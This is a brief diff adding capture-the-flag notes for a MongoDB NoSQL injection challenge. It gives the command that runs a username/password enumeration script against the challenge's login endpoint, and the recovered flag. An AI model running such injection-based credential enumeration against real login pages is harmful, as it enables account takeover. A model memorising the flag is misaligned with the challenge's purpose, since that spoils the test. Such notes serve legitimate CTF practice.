@@ -1,0 +1,7 @@
+MongoDB => NOSQL injection
+
+Revise nosqli-user-pass-enum.py (302 => )
+
+python3 nosqli-user-pass-enum.py -u http://logintest.ctf.devcore.tw:1337/login -up username -pp password -ep password -m POST
+
+Password: DEVCORE{youtu.be/UADoH5n1RLM}
